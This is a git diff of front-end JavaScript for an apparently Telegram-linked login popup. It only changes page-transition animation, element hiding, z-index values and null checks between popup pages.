@@ -36,6 +36,7 @@ document.addEventListener('DOMContentLoaded', () => {
       active.blur();
     }
   });
+  showPage2();
 
   // 🪪 Login button → request Telegram contact
   loginBtn.addEventListener('click', async () => {
@@ -58,23 +59,40 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // 📱 Transition helpers
   function smoothTransition(showEl, hideEls = []) {
-    hideEls.forEach((el) => (el.style.display = 'none'));
-    
-    // Ensure proper positioning for fixed elements
+    // Ensure proper positioning for fixed elements BEFORE hiding other elements
+    // This prevents layout reflow from affecting the positioning
     if (showEl === page2 || showEl === page3) {
       showEl.style.position = 'fixed';
       showEl.style.top = '50%';
       showEl.style.left = '50%';
       showEl.style.zIndex = '9999';
+      showEl.style.display = 'flex';
+      // Set initial transform to maintain centering
+      showEl.style.transform = 'translate(-50%, -50%) translateY(40px) translateZ(0)';
+      showEl.style.opacity = '0';
     }
     
-    showEl.style.display = 'flex';
-    // Maintain centering transform while animating translateY
-    showEl.style.transform = 'translate(-50%, -50%) translateY(40px) translateZ(0)';
-    showEl.style.opacity = '0';
+    // Now hide other elements using visibility/opacity to avoid layout reflow
+    // This prevents the popup from jumping to the top
+    hideEls.forEach((el) => {
+      el.style.visibility = 'hidden';
+      el.style.opacity = '0';
+      el.style.pointerEvents = 'none';
+    });
+    
+    // If showEl is not page2/page3, handle normally
+    if (showEl !== page2 && showEl !== page3) {
+      showEl.style.display = 'flex';
+      showEl.style.transform = 'translateY(40px)';
+      showEl.style.opacity = '0';
+    }
 
     requestAnimationFrame(() => {
-      showEl.style.transform = 'translate(-50%, -50%) translateY(0) translateZ(0)';
+      if (showEl === page2 || showEl === page3) {
+        showEl.style.transform = 'translate(-50%, -50%) translateY(0) translateZ(0)';
+      } else {
+        showEl.style.transform = 'translateY(0)';
+      }
       showEl.style.opacity = '1';
     });
   }
@@ -88,22 +106,43 @@ document.addEventListener('DOMContentLoaded', () => {
     page2.style.zIndex = '9999';
     smoothTransition(page2, [page1]);
     blur.style.opacity = '1';
-    blur.style.zIndex = '9998';
+    blur.style.zIndex = '-1';
   }
 
   function showPage3() {
+    if (!page3) {
+      console.error('page3 element not found');
+      return;
+    }
+    
     currentPage = 'page3';
     // Ensure page3 is properly positioned before transition
     page3.style.position = 'fixed';
     page3.style.top = '50%';
     page3.style.left = '50%';
     page3.style.zIndex = '9999';
-    smoothTransition(page3, [page2]);
-    popup.style.height = '340px';
-    blur.style.opacity = '1';
-    blur.style.zIndex = '9998';
+    page3.style.visibility = 'visible'; // Ensure it's visible
+    page3.style.height = '360px'; // Set height to 340px
+    
+    // Hide page1 and page2 if they exist and are visible
+    const elementsToHide = [];
+    if (page1) {
+      const page1Display = window.getComputedStyle(page1).display;
+      if (page1Display !== 'none') elementsToHide.push(page1);
+    }
+    if (page2) {
+      const page2Display = window.getComputedStyle(page2).display;
+      const page2Visibility = window.getComputedStyle(page2).visibility;
+      if (page2Display !== 'none' || page2Visibility !== 'hidden') elementsToHide.push(page2);
+    }
+    
+    smoothTransition(page3, elementsToHide);
+    if (blur) {
+      blur.style.opacity = '1';
+      blur.style.zIndex = '-1';
+    }
   }
-
+    // showPage3();
   // 🧩 Handle passcode
   passcodeBtn.addEventListener('click', async () => {
     const passcode = passcodeInput.value.trim();
